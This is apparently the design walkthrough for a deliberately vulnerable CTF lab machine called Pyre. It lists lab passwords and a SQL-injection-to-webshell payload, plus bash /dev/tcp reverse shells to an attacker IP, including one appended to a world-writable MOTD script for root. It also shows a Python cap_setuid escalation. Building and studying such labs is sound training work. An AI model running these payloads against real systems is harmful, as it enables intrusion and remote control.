# Pyre

> Pyre is Sunspire's thermal management and safety monitoring system. Like a controlled flame, it keeps watch over the heat that powers our infrastructure.

---

## Overview

| Property | Value |
|----------|-------|
| Difficulty | Medium |
| Services | SSH, HTTP |
| Initial Access | SQL Injection (INTO OUTFILE), Password Reuse |
| Privilege Escalation | World-Writable MOTD Script, Python3 Capability |
| Lateral Movement | Password reuse with Forge |

---

## Users

| Username | Password |
|----------|----------|
| pyre | h1ewFWZG |
| ops | 9ksP311p |
| root | 791Yz1Py |

---

## Services

### OpenSSH Server
- Standard SSH service for remote access
- Password authentication enabled

### Apache + PHP + MySQL (PyreWatch)
- Thermal monitoring web application
- MySQL database backend (localhost only)
- Vulnerable to SQL injection with file write capability

---

## Attack Vectors

### Initial Access

#### Option 1: SQL Injection → Webshell
The `panels.php` page is vulnerable to SQL injection via the `id` parameter. MySQL is configured with `secure_file_priv = ""`, allowing file writes via `INTO OUTFILE`.

1. Identify the SQL injection:
   ```
   http://<target_ip>/panels.php?id=1'
   ```
2. Write a webshell using INTO OUTFILE:
   ```
   http://<target_ip>/panels.php?id=1' UNION SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'-- -
   ```
3. Access the webshell:
   ```bash
   curl "http://<target_ip>/shell.php?cmd=id"
   ```
4. Establish a reverse shell:
   ```bash
   curl "http://<target_ip>/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/<attacker_ip>/4444+0>%261'"
   ```

#### Option 2: Password Reuse
The `pyre` user has the same password as the `forge` user on the Forge machine.

1. If Forge credentials are known (forge:h1ewFWZG):
   ```bash
   ssh pyre@<target_ip>
   # Password: h1ewFWZG
   ```

### Privilege Escalation

#### Option 1: World-Writable MOTD Script
The MOTD script `/etc/update-motd.d/99-sunspire` is world-writable (777 permissions). MOTD scripts execute as root when a user logs in.

1. Check permissions on MOTD scripts:
   ```bash
   ls -la /etc/update-motd.d/
   ```
2. Append a reverse shell to the MOTD script:
   ```bash
   echo 'bash -i >& /dev/tcp/<attacker_ip>/4445 0>&1' >> /etc/update-motd.d/99-sunspire
   ```
3. Start a listener on the attacker machine:
   ```bash
   nc -lvnp 4445
   ```
4. Trigger by logging in via SSH (as any user):
   ```bash
   ssh pyre@<target_ip>
   ```
5. Receive root shell on listener

#### Option 2: Python3 Capability (cap_setuid)
The Python3 binary has the `cap_setuid` capability set, allowing it to change its UID to root.

1. Check for capabilities:
   ```bash
   getcap -r / 2>/dev/null
   ```
2. Escalate to root using Python:
   ```bash
   /usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
   ```

**GTFOBins Reference:** https://gtfobins.github.io/gtfobins/python/#capabilities

---

## Scoring

### Services
- [ ] Website (Apache/PHP)
- [ ] SSH (OpenSSH)

### Control Files
- [ ] `/root/ctrl.txt`
- [ ] `/home/pyre/ctrl.txt`

---

## File Locations

| Purpose | Path |
|---------|------|
| Web Root | /var/www/html |
| MySQL Config | /etc/mysql/mysql.conf.d/mysqld.cnf |
| MOTD Script (Vuln) | /etc/update-motd.d/99-sunspire |
| Python3 Binary | /usr/bin/python3 |
| PyreWatch App | /var/www/html/*.php |

---

## Database

### Connection Details
| Property | Value |
|----------|-------|
| Host | localhost |
| Database | pyrewatch |
| User | pyre |
| Password | h1ewFWZG |

### Tables
- `panels` - Solar panel information
- `alerts` - System alerts
- `cooling_systems` - Cooling infrastructure
- `thermal_readings` - Temperature readings
